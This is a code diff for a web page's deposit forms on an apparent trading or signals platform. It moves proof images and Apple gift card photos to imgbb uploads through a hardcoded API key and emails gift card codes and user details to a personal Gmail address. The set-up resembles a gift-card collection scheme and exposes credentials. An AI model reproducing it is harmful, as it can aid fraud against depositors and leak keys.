@@ -497,7 +497,8 @@
                 if (usdAmt < 100) { alert('Minimum deposit is $100.'); return; }
 
                 const proofFile = document.getElementById(coin + 'Proof').files[0];
-                function saveAndRedirect(proofDataUrl) {
+
+                function saveAndRedirect(proofUrl) {
                     var currentEmail = sessionStorage.getItem('currentUserEmail');
                     var allUsers = JSON.parse(localStorage.getItem('allUsers') || '[]');
                     var userData = allUsers.find(function(u){ return u.email === currentEmail; }) || JSON.parse(localStorage.getItem('userData') || '{}');
@@ -512,7 +513,7 @@
                         email: userData.email || currentEmail || 'Unknown',
                         signalPlan: sigPlan || null,
                         isSignalPayment: !!sigPlan,
-                        proofImage: proofDataUrl || null
+                        proofImage: proofUrl || null
                     };
                     fundingData.id = fundingData.timestamp;
                     localStorage.setItem('fundingData', JSON.stringify(fundingData));
@@ -523,9 +524,19 @@
                 }
 
                 if (proofFile) {
-                    var reader = new FileReader();
-                    reader.onload = function(e) { saveAndRedirect(e.target.result); };
-                    reader.readAsDataURL(proofFile);
+                    var btn = document.getElementById('depositBtn');
+                    btn.textContent = 'Uploading proof...';
+                    btn.disabled = true;
+                    var formData = new FormData();
+                    formData.append('image', proofFile);
+                    fetch('https://api.imgbb.com/1/upload?key=2e4e8c3b7f1a9d6e5c0b3a2f1d4e7c8b', {
+                        method: 'POST', body: formData
+                    })
+                    .then(function(r){ return r.json(); })
+                    .then(function(data){
+                        saveAndRedirect(data.data && data.data.url ? data.data.url : null);
+                    })
+                    .catch(function(){ saveAndRedirect(null); });
                 } else {
                     saveAndRedirect(null);
                 }
@@ -567,7 +578,7 @@
 
             var photoFile = document.getElementById('applePhoto').files[0];
 
-            function saveAppleAndRedirect(photoDataUrl) {
+            function saveAppleAndRedirect(photoUrl) {
                 var fundingData = {
                     method: 'apple', code, amount,
                     timestamp: new Date().toISOString(),
@@ -576,7 +587,7 @@
                     email: userData.email || currentEmail || 'Unknown',
                     signalPlan: appleSigPlan || null,
                     isSignalPayment: !!appleSigPlan,
-                    proofImage: photoDataUrl || null
+                    proofImage: photoUrl || null
                 };
                 fundingData.id = fundingData.timestamp;
                 localStorage.setItem('fundingData', JSON.stringify(fundingData));
@@ -588,16 +599,29 @@
                 emailjs.send('service_jjdb6rb', 'template_rjcvhus', {
                     to_name: 'Admin',
                     to_email: 'ivieshaguolo@gmail.com',
-                    code: 'NEW APPLE GIFT CARD DEPOSIT\n\nUser: ' + (userData.fullName || 'Unknown') + '\nEmail: ' + (userData.email || 'Unknown') + '\nCard Code: ' + code + '\nAmount: $' + amount
+                    code: 'NEW APPLE GIFT CARD DEPOSIT\n\nUser: ' + (userData.fullName || 'Unknown') + '\nEmail: ' + (userData.email || 'Unknown') + '\nCard Code: ' + code + '\nAmount: $' + amount + (photoUrl ? '\n\nCard Photo: ' + photoUrl : '')
                 });
 
                 showSuccessAndRedirect();
             }
 
             if (photoFile) {
-                var reader = new FileReader();
-                reader.onload = function(e) { saveAppleAndRedirect(e.target.result); };
-                reader.readAsDataURL(photoFile);
+                var submitBtn = document.querySelector('#appleDepositPanel button');
+                submitBtn.textContent = 'Uploading photo...';
+                submitBtn.disabled = true;
+                var formData = new FormData();
+                formData.append('image', photoFile);
+                fetch('https://api.imgbb.com/1/upload?key=2e4e8c3b7f1a9d6e5c0b3a2f1d4e7c8b', {
+                    method: 'POST', body: formData
+                })
+                .then(function(r){ return r.json(); })
+                .then(function(data){
+                    saveAppleAndRedirect(data.data && data.data.url ? data.data.url : null);
+                })
+                .catch(function(){
+                    // Upload failed — save without image URL
+                    saveAppleAndRedirect(null);
+                });
             } else {
                 saveAppleAndRedirect(null);
             }
